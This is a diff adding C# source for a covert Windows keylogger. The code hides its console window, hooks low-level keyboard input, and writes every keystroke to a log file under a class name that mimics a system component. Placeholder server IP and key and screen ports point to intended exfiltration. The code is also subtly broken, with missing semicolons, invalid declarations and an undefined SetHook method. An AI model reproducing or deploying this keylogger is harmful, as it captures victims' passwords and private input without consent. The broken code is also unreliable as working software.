@@ -1,0 +1,71 @@
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Diagnostics;
+using System.Windows.Forms;
+
+public static class Globals
+{
+    public static String serverIP = "~~~~~"
+    public const Int32 keyPort = 40404
+    public const Int32 screenPort = 40405
+    public const char[256] keysLogged
+    public const int bufIndex = 0
+}
+
+public class Windows_System32_Startup
+{
+    private const WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private LowLevelKeyboardProc proc = HookFunc;
+    private static IntPtr hookInt = IntPtr.Zero;
+    
+    static public void Main ()
+    {
+        var wind = GetConsoleWindow();
+        ShowWindow(wind, SW_HIDE);
+        hookInt = SetHook(proc);
+        Application.Run();
+        UnhookWindowsHookEx(hookInt);
+    }
+    
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    private static IntPtr HookFunc(int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+        {
+            int vkCode = Marshal.ReadInt32(lParam);
+            Console.WriteLine((Keys)vkCode);
+            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
+            sw.Write((Keys)vkCode);
+            sw.Close();
+        }
+        return CallNextHookEx(hookInt, nCode, wParam, lParam);
+    }
+    
+    //These Dll's will handle the hooks.
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook,
+    LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+    IntPtr wParam, IntPtr lParam);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    // The two dll imports below will handle the window hiding.
+    
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+    
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    
+    const int SW_HIDE = 0;
+}
